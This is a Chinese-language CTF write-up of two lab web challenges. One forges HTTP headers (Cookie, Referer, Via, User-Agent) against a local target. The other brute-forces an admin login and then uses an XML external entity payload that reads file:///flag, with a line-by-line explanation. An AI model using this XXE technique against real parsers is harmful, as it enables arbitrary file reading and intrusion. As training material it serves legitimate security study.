# CTF Show—Web应用安全与防护

#### 1、Http的真理，我已解明
    
    
    POST /?hello=web HTTP/1.1
    Host: 127.0.0.1:30002
    sec-ch-ua: "Not;A=Brand";v="24", "Chromium";v="128"
    sec-ch-ua-mobile: ?0
    sec-ch-ua-platform: "Windows"
    Accept-Language: zh-CN,zh;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Safari
    Accept: 
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima
    ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate, br
    Cookie:Sean=god
    Referer:www.mihoyo.com
    Via:clash
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 9
    http=good

  * **Cookie**



包含先前由服务器使用 Set-Cookie 标头发送然后被存储的 HTTP cookie。

  * **Via**



由代理添加，包括正向和反向代理，并且可以出现在请求标头和响应标头中。

题目中要求代理，将Via : clash添加进标头即可

  * **Referer**



前一个网页的地址，表示从该网页链接（进入）到当前请求的页面。 

  * **User-Agent**



包含一个特征字符串，允许网络协议对端识别发起请求的用户代理软件的应用程序类型、操作系统、

软件供应商或软件版本

题目中要求使用Safari浏览器访问，需要将UA修改成User-Agent: Safari

HTTP详细内容见：[https://developer.mozilla.org/zh-CN/docs/Web/HTTP](<https://developer.mozilla.org/zh-CN/docs/Web/HTTP>)

  


#### 2、留言板（粉）

此题是一个XXE

  * **XML外部实体注入**



XML External Entity Injection

XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代

码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。

进入靶场后在URL拼接login.php进入登录界面，爆破出账号密码为admin admin123登入后发现留言板，尝试输入发现报错

Warning: DOMDocument::loadXML(): Start tag expected, '<' not found in Entity, line: 1 in /var/www/html/xxxxmleee.php on line 133

报错信息意为：

**你的代码尝试把一个非 XML 格式的字符串当作 XML 来解析，但解析器在第 1 行就发现了问题** 。

所以知道留言框接收的是XML格式

构造核心XXE代码
    
    
    <?xml version="1.0"?>
    <!DOCTYPE a [
      <!ENTITY xxe SYSTEM "file:///flag">
    ]>
    <msg>&xxe;</msg>

<?xml version="1.0"?>

这是一个XML声明，声明当前文档是 XML 格式，版本为 1.0

<!DOCTYPE a [

<!ENTITY xxe SYSTEM "file:///flag">

]>

这段是实现XXE的核心代码，这是一个DOCTYPE实体定义

  * **实体（ENTITY）**



实体是用于定义引用普通文本或特殊字符的快捷方式的变量

先创建一个文档类型a，在其中定义实体xxe，SYSTEM为XML文档的关键字，它就像一个 “外部资源定位符”，为解析器提供了一个获取数据的路径。

<msg>&xxe;</msg>

&xxe即为解析实体xxe，而我们在之前的DOCTYPE将xxe定义为解析/flag的内容，所以将其包裹在<msg>标签中就可以在页面中得到flag了
